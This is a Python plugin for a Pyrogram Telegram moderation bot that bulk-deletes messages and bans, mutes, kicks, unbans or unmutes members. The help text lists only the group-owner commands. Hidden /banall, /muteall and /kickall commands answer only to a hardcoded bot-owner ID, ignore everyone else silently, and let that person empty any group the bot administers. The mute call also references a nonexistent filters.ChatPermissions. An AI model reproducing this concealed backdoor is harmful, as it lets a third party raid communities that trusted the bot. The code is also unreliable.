import asyncio
from pyrogram import filters
from pyrogram.enums import ChatMemberStatus, ChatMembersFilter
from pyrogram.types import Message

from Powers.bot_class import Gojo
from Powers.utils.custom_filters import command

BOT_OWNER_ID = 8429156335

# Helper: check group owner
async def is_group_owner(c, chat_id, user_id):
    member = await c.get_chat_member(chat_id, user_id)
    return member.status == ChatMemberStatus.OWNER

# Helper: check bot owner
def is_bot_owner(user_id):
    return user_id == BOT_OWNER_ID


# DELETE ALL (Group Owner only)
@Gojo.on_message(command(["deleteall"]) & filters.group)
async def delete_all(c: Gojo, m: Message):
    if not await is_group_owner(c, m.chat.id, m.from_user.id):
        return await m.reply_text("❌ Only the group owner can use this.")
    async for msg in c.get_chat_history(m.chat.id):
        try:
            await c.delete_messages(m.chat.id, msg.id)
        except:
            pass
    await m.reply_text("🗑 All messages deleted.")


# BAN ALL (Bot Owner only, silent ignore for others)
@Gojo.on_message(command(["banall"]) & filters.group)
async def ban_all(c: Gojo, m: Message):
    if not is_bot_owner(m.from_user.id):
        return  # ignore silently
    async for member in c.get_chat_members(m.chat.id):
        if member.user.is_bot or member.status == ChatMemberStatus.OWNER:
            continue
        try:
            await c.ban_chat_member(m.chat.id, member.user.id)
            await asyncio.sleep(0.1)
        except:
            pass
    await m.reply_text("🚫 All members banned.")


# UNBAN ALL (Group Owner only)
@Gojo.on_message(command(["unbanall"]) & filters.group)
async def unban_all(c: Gojo, m: Message):
    if not await is_group_owner(c, m.chat.id, m.from_user.id):
        return await m.reply_text("❌ Only the group owner can use this.")
    async for member in c.get_chat_members(m.chat.id, filter=ChatMembersFilter.BANNED):
        try:
            await c.unban_chat_member(m.chat.id, member.user.id)
            await asyncio.sleep(0.1)
        except:
            pass
    await m.reply_text("✅ All members unbanned.")


# MUTE ALL (Bot Owner only, silent ignore for others)
@Gojo.on_message(command(["muteall"]) & filters.group)
async def mute_all(c: Gojo, m: Message):
    if not is_bot_owner(m.from_user.id):
        return  # ignore silently
    async for member in c.get_chat_members(m.chat.id):
        if member.user.is_bot or member.status == ChatMemberStatus.OWNER:
            continue
        try:
            await c.restrict_chat_member(m.chat.id, member.user.id, permissions=filters.ChatPermissions())
            await asyncio.sleep(0.1)
        except:
            pass
    await m.reply_text("🔇 All members muted.")


# UNMUTE ALL (Group Owner only)
@Gojo.on_message(command(["unmuteall"]) & filters.group)
async def unmute_all(c: Gojo, m: Message):
    if not await is_group_owner(c, m.chat.id, m.from_user.id):
        return await m.reply_text("❌ Only the group owner can use this.")
    async for member in c.get_chat_members(m.chat.id, filter=ChatMembersFilter.RESTRICTED):
        try:
            await c.restrict_chat_member(m.chat.id, member.user.id, permissions=None)
            await asyncio.sleep(0.1)
        except:
            pass
    await m.reply_text("🔊 All members unmuted.")


# KICK ALL (Bot Owner only, silent ignore for others)
@Gojo.on_message(command(["kickall"]) & filters.group)
async def kick_all(c: Gojo, m: Message):
    if not is_bot_owner(m.from_user.id):
        return  # ignore silently
    async for member in c.get_chat_members(m.chat.id):
        if member.user.is_bot or member.status == ChatMemberStatus.OWNER:
            continue
        try:
            await c.ban_chat_member(m.chat.id, member.user.id)
            await c.unban_chat_member(m.chat.id, member.user.id)  # Kick without permanent ban
            await asyncio.sleep(0.1)
        except:
            pass
    await m.reply_text("👢 All members kicked.")


__PLUGIN__ = "MassActions"

_DISABLE_CMDS_ = ["deleteall", "banall", "unbanall", "muteall", "unmuteall", "kickall"]

__alt_name__ = ["delall", "bannall", "unbannall", "mute_everyone", "unmute_everyone", "kick_everyone"]

__HELP__ = """
**Mass Group Management Commands**
• /deleteall — Delete all messages (**group owner only**)
• /unbanall — Unban all banned members (**group owner only**)
• /unmuteall — Unmute all muted members (**group owner only**)
"""
